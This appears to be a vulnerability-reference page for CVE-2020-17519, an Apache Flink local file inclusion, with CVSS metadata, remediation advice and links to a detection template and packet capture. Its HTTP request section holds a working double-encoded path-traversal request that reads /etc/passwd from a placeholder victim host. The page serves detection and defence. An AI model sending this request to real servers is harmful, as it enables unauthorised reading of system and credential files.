---
layout: post
cve_id: CVE-2020-17519
title: Apache Flink - Local File Inclusion
pcap: true
pcap_path: /pcaps/2020/CVE-2020-17519.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-17519.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pdteam
severity: high
impact: 'Unauthenticated attackers can read arbitrary files from the JobManager local
  filesystem, potentially exposing sensitive configuration files, credentials, and
  proprietary data.

  '
remediation: 'Apply the latest security patches or upgrade to a patched version of
  Apache Flink to mitigate the vulnerability.

  '
reference:
- https://github.com/B1anda0/CVE-2020-17519
- https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d%40%3Cdev.flink.apache.org%3E
- https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d@%3Cdev.flink.apache.org%3E
- https://lists.apache.org/thread.html/r6843202556a6d0bce9607ebc02e303f68fc88e9038235598bde3b50d@%3Cuser.flink.apache.org%3E
- https://nvd.nist.gov/vuln/detail/CVE-2020-17519
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2020-17519
  cwe-id: CWE-552
  epss-score: 0.94383
  epss-percentile: 0.99967
  cpe: cpe:2.3:a:apache:flink:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: apache
  product: flink
tags:
- cve
- cve2020
- apache
- lfi
- flink
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
Apache Flink 1.11.0 (and released in 1.11.1 and 1.11.2 as well) allows attackers to read any file on the local filesystem of the JobManager through the REST interface of the JobManager process (aka local file inclusion).

## üåê HTTP Request
```nohighlight
GET /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

